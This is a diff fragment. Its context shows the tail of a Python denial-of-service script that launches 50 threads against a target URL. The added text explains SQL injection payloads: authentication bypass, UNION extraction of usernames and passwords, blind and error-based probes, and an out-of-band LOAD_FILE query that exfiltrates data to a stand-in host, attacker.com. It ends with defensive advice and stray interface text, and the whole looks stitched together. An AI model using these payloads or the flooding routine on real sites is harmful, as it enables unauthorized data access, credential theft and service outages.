@@ -457,3 +457,83 @@ if __name__ == "__main__":
     num_threads = 50  # Number of threads to simulate multiple requests
     dos_attack(target_url, num_threads)
 
+
+
+/// 
+
+Search query attacks, particularly SQL injection attacks, involve manipulating a website's database queries through user input fields. Here are some examples of how such attacks might be structured:
+
+
+
+
+Basic SQL Injection:
+
+
+
+Example: An attacker might input a single quote (') in a search field to see if the website is vulnerable to SQL injection. If the website does not properly sanitize the input, it could result in a database error that reveals information about the database structure.
+
+URL Example: https://insecure-website.com/products?category=Gifts'--
+
+
+
+
+Bypassing Authentication:
+
+
+
+Example: An attacker could input a SQL snippet into a login form to bypass authentication. For instance, entering admin'-- as the username and leaving the password field blank could result in a query that logs the attacker in as an administrator without needing a password.
+
+Query Example: SELECT * FROM users WHERE username = 'admin'--' AND password = ''
+
+
+
+
+Union-Based SQL Injection:
+
+
+
+Example: An attacker could use the UNION SQL operator to combine results from different tables, potentially accessing sensitive data. For example, an input like ' UNION SELECT username, password FROM users-- could append a malicious query to the original query.
+
+URL Example: https://insecure-website.com/products?category=Gifts' UNION SELECT username, password FROM users--
+
+
+
+
+Blind SQL Injection:
+
+
+
+Example: In cases where the results of an injection are not visible, an attacker might use conditional statements to infer information. For example, an input like ' AND 1=1-- might always return true, while ' AND 1=2-- would return false, allowing the attacker to deduce information based on the responses.
+
+Query Example: SELECT * FROM products WHERE category = 'Gifts' AND 1=1--
+
+
+
+
+Error-Based SQL Injection:
+
+
+
+Example: An attacker might deliberately cause database errors to extract information. For instance, inputting ' OR 1=CONVERT(int, (SELECT table_name FROM information_schema.tables))-- could cause the database to return an error message that includes the names of tables in the database.
+
+Query Example: SELECT * FROM products WHERE category = 'Gifts' OR 1=CONVERT(int, (SELECT table_name FROM information_schema.tables))--
+
+
+
+
+Out-of-Band SQL Injection:
+
+
+
+Example: This type of attack involves using external network calls to extract data. For example, an attacker might input a query that causes the database to make an HTTP request to a server controlled by the attacker, exfiltrating data through the request.
+
+Query Example: SELECT * FROM products WHERE category = 'Gifts' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'.attacker.com\\share\\')))--
+
+
+
+
+These examples illustrate how attackers can exploit vulnerabilities in web applications to manipulate database queries and gain unauthorized access to sensitive information. It is crucial for developers to implement robust security measures, such as input validation, parameterized queries, and proper error handling, to prevent such attacks.
+
+@ Add Context
+AI Beta
+
